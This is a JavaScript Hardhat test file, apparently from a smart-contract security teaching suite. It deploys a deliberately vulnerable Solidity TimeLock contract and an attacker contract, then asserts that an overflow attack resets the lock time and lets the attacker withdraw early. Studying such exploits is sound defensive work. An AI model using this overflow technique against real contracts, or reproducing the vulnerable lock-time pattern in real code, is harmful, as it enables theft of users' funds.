const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack arithmetic/timeLock.sol', function () {
    async function deployContracts() {
      const TimeLock = await ethers.getContractFactory('contracts/arithmetic/timelock.sol:TimeLock');
      const victim = await TimeLock.deploy();  
      await victim.waitForDeployment();
      const address = await victim.getAddress();

      const TimeLockAttacker = await ethers.getContractFactory('contracts/arithmetic/timelock_attack.sol:TimeLockAttacker');
      const attacker = await TimeLockAttacker.deploy(address);  
      await attacker.waitForDeployment();
      return {victim, attacker};
    }

  
    it('exploit overflow vulnerability', async function () {
      const {victim, attacker} = await loadFixture(deployContracts);
      const attacker_addr = await attacker.getAddress();
      expect(await victim.balances(attacker_addr)).to.equal(0);
      expect(await victim.lockTime(attacker_addr)).to.equal(0);

      const amount = ethers.parseEther("1.0");
      const options = {value: amount};

      await attacker.deposit(options);

      expect(await victim.balances(attacker_addr)).to.equal(amount);
      let lockTime = await victim.lockTime(attacker_addr);
      expect(lockTime).to.greaterThan(0);
      const attackerBalanceBefore = await ethers.provider.getBalance(
        attacker_addr
      );

      expect(attackerBalanceBefore).to.equal(0);
      await attacker.attack();
      lockTime = await victim.lockTime(attacker_addr);
      expect(lockTime).to.equal(0);

      await attacker.withdraw();
      const attackerBalanceAfter = await ethers.provider.getBalance(
        attacker_addr
      );
      expect(attackerBalanceAfter).to.equal(amount);
    });
  });